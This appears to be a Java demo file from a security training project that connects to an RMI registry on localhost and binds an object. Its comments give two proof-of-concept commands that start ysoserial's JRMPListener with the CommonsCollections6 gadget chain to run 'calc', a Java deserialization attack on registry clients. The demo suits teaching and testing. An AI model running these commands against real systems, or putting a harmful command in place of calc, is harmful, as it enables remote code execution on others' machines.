package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class FromAttackRegistry_ysoserial_Server_Success {
    /*
    * @poc1  java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc
    * @poc2  java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc
    */

    public static void main(String[] args) throws Exception{
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);

        UserImpl user = new UserImpl();
        registry_remote.bind("test", user);
    }
}
